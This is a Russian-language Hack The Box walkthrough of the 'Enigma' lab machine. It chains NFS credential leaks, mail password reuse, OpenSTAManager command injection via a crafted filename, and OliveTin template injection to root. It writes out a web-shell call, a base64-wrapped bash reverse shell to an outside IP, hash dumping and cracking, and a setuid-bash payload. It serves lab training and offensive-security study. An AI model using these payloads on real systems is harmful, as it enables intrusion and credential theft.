# Enigma (HTB)

> Платформа: Hack The Box  
> ОС: Linux  
> Сложность: Средне  
> Результат: root

---

## Цепочка Атаки

```text
Разведка
├── nmap -sC -sV -p- enigma.htb → 22 (SSH, только ключи), 80 (nginx)
├── 110/143/993/995 (Dovecot POP3/IMAP)
└── 111/2049 + mountd/nlockmgr (NFS)

Первичный Доступ (NFS)
├── showmount -e enigma.htb → /srv/nfs/onboarding *
├── mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
├── pdftotext New_Employee_Access.pdf → kevin:<PASSWORD>
└── /etc/hosts: 10.129.239.191 enigma.htb mail001.enigma.htb

Боковое Перемещение (Password Reuse + Mail)
├── IMAP: curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
├── Roundcube → sarah:<PASSWORD>
├── Письмо IT → OpenSTAManager: admin:<PASSWORD>
└── /etc/hosts: support_001.enigma.htb

Эксплуатация (OpenSTAManager CVE-2025-69212)
├── Версия: 2.9.8 (info.php)
├── OS Command Injection через P7M-файлы (decodeP7M → exec без экранирования)
├── ZIP с вредоносным именем → Sales → Invoices → Importazione FE
├── curl "http://support_001.enigma.htb/files/SHELL.php?c=id" → www-data
└── Reverse shell: nc -lvnp 4444

Боковое Перемещение (Config → MySQL → Hash)
├── config.inc.php → brollin / <PASSWORD>
├── mysql → SELECT username, password FROM zz_users
├── haris:$2y$... (bcrypt)
└── hashcat -m 3200 → haris:<PASSWORD>

Флаг Пользователя
└── su haris → user.txt

Повышение Привилегий (OliveTin)
├── ps aux → /usr/local/bin/OliveTin (root, 127.0.0.1:1337)
├── /etc/OliveTin/config.yaml → backup_database (shell: mysqldump {{ db_pass }})
├── Exploit: db_pass = "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"
└── /tmp/.bs -p → root
```

> [!NOTE]
> Все флаги, пароли, хеши и токены сессий были замаскированы по этическим соображениям.

---

## Брифинг Машины

Многосервисная Linux-машина: почтовый сервер (Dovecot), NFS, Roundcube, OpenSTAManager и локальный OliveTin под root.

---

## Разведка

### Port Scan

```bash
nmap -sC -sV -p- -oN nmap_full.txt enigma.htb
```

| Порт | Сервис  | Комментарий          |
|------|---------|----------------------|
| 22   | SSH     | OpenSSH 9.6, ключи   |
| 80   | HTTP    | nginx                |
| 110  | POP3    | Dovecot              |
| 143  | IMAP    | Dovecot              |
| 993  | IMAPS   | Dovecot              |
| 995  | POP3S   | Dovecot              |
| 111  | rpcbind | NFS                  |
| 2049 | NFS     | NFS                  |

---

## Первичный Доступ (NFS)

```bash
showmount -e enigma.htb
# /srv/nfs/onboarding *

mkdir /tmp/nfs_enigma
sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
ls -la /tmp/nfs_enigma
pdftotext /tmp/nfs_enigma/New_Employee_Access.pdf -
```

Учётные данные:

- Username: `kevin`
- Password: `<PASSWORD>`
- Webmail: `http://mail001.enigma.htb`

---

## Боковое Перемещение (Password Reuse + Mail)

```bash
# /etc/hosts:
# 10.129.239.191 enigma.htb mail001.enigma.htb

curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:<PASSWORD>'
```

В INBOX - приветственное письмо от `sarah@enigma.htb`.

Roundcube: `http://mail001.enigma.htb`, вход `sarah:<PASSWORD>`. В почте - письмо IT с доступами к OpenSTAManager:

- URL: `http://support_001.enigma.htb`
- Username: `admin`
- Password: `<PASSWORD>`

---

## Эксплуатация (OpenSTAManager)

```
http://support_001.enigma.htb/info.php → Version: 2.9.8
```

Уязвима к **CVE-2025-69212** - OS Command Injection через P7M-файлы.

Собираем ZIP с вредоносным именем файла, загружаем через Sales → Sales Invoices → Importazione FE.

Проверка RCE:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
# uid=33(www-data)
```

Reverse shell:

```bash
nc -lvnp 4444
echo -n 'bash -i >& /dev/tcp/10.10.14.160/4444 0>&1' | base64 -w0
curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode 'c=echo <base64> | base64 -d | bash'
```

Stabilize:

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Боковое Перемещение (Config → MySQL → Hash)

```bash
cat /var/www/html/openstamanager/config.inc.php
# $db_username = 'brollin';
# $db_password = '<PASSWORD>';

mysql -u brollin -p'<PASSWORD>' openstamanager
SELECT username, password FROM zz_users;

hashcat -m 3200 haris-hash /usr/share/wordlists/rockyou.txt --force
# haris:<PASSWORD>

su haris
cat ~/user.txt
```

---

## Повышение Привилегий (OliveTin)

```bash
ps aux | grep root
# /usr/local/bin/OliveTin (root, 127.0.0.1:1337)

cat /etc/OliveTin/config.yaml
```

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

Параметр `db_pass` подставляется в shell без экранирования одинарных кавычек.

API:

```bash
curl -s -X POST "http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard" \
  -H 'Content-Type: application/json' --data '{}'
```

Exploit:

```bash
cat > /tmp/backdoor.json <<'JSON'
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; install -m 4755 /bin/bash /tmp/.bs ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
JSON

curl -s -X POST -H 'Content-Type: application/json' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait | jq .
```

Root:

```bash
/tmp/.bs -p
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Флаги

| Флаг | Значение                         |
|------|----------------------------------|
| User | (см. `~/user.txt` для haris)     |
| Root | <ROOT_FLAG> |

---

## Ключевые Выводы

- **NFS без ограничений** - всегда проверять `showmount -e`.
- **Password reuse** - временные пароли часто не меняют.
- **CVE-хантинг по версии.**
- **Command injection через шаблонизацию** - `{{ }}` в shell без санитизации.
- **Привилегированные локальные сервисы** (OliveTin на 127.0.0.1) - классический privesc-вектор.
